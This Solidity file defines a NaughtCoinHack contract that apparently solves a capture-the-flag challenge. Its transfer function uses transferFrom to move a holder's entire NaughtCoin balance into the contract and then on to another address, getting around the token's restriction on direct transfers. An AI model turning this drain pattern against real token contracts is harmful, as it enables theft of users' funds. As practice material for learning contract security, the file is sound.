// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import { NaughtCoin } from "./NaughtCoin.sol";

contract NaughtCoinHack {
    NaughtCoin coin;

    constructor(address _coinAddress) {
        coin = NaughtCoin(_coinAddress);
    }

    function transfer(address _from, address _to) public {
        coin.transferFrom(_from, address(this), coin.balanceOf(_from));
        coin.transfer(_to, coin.balanceOf(address(this)));
  }
}